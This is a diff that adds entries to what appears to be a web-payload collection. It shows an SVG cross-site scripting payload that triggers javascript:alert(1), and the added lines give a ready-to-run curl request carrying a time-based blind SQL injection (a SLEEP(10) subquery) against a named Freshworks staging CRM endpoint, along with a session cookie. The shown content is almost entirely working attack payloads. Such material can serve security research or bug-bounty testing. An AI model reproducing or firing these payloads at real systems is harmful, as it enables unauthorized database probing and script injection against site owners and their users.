@@ -154,3 +154,12 @@ https://gist.github.com/soaj1664/9588791
 
     <svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=%26>
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Blind SQL Injection
+-------------------
+
+time curl -i -s -k -X $'GET' \
+    -H $'Host: stagingtest1-370152928458753427.myfreshworks.dev' -H $'Content-Type: application/json' -H $'X-Requested-With: XMLHttpRequest' \
+    -b $'_d=ZGI0NmU1ZTAtYzNkNi00MWQxLTkzYzgtZTMzZGMxMzFlOWRm' \
+    $'https://stagingtest1-370152928458753427.myfreshworks.dev/crm/sales/activities_dashboard?include=targetable,sales_activity_outcome,outcome,conference&start_date=2021-10-18T00%3A00%3A00.000-04%3A00&end_date=2021-10-18T23%3A59%3A59.999-04%3A00&tasks%5B%5D=(SELECT*FROM(SELECT(SLEEP(10)))x)&has_appointments=true&is_open_activities=true&is_completed_activities=true&is_overdue_activities=true&page=1&per_page=100&_=1634588286815'
